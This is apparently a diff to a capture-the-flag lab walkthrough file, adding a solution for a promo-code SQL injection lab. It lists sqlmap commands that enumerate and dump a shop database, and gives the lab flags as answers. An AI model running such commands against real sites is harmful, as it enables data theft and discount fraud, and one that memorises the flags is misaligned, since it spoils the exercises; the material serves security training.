@@ -283,4 +283,37 @@ goood luck
 - after running you will find the flag
 - the flag is JAVA_SQLINJECTION_STUDENT
 - good luck
-- 
+
+## Lab3 4F1ng3r Discount
+Let's have fun with promocodes. You have to find a 100% discount promocode. We will identify the database version and work with it.
+
+````markdown
+## Task
+Find the 100% promo code, apply it, make an order, and get the flag.
+## Steps
+1. Go to `http://www.hacktory.lab` and open the promo code page.
+2. Intercept the promo code POST request (parameter: `promocode`) using **Burp Suite**.
+3. Confirm SQL injection on `promocode` using **sqlmap**:  
+   ```bash
+   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" --batch --dbs
+````
+4. Enumerate the database and tables:
+   ```bash
+   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop --tables --batch
+   ```
+5. Get columns of the `promo` table:
+   ```bash
+   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop -T promo --columns --batch
+   ```
+6. Dump all promo codes and modifiers:
+   ```bash
+   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop -T promo --dump --batch
+   ```
+7. Find the promo code with `modifier = 100` (100% discount).
+8. Apply the 100% promo code on the website to make an order.
+9. Receive the flag in the response:
+   ```
+   not_easy_sql_injection
+   ```
+---
+
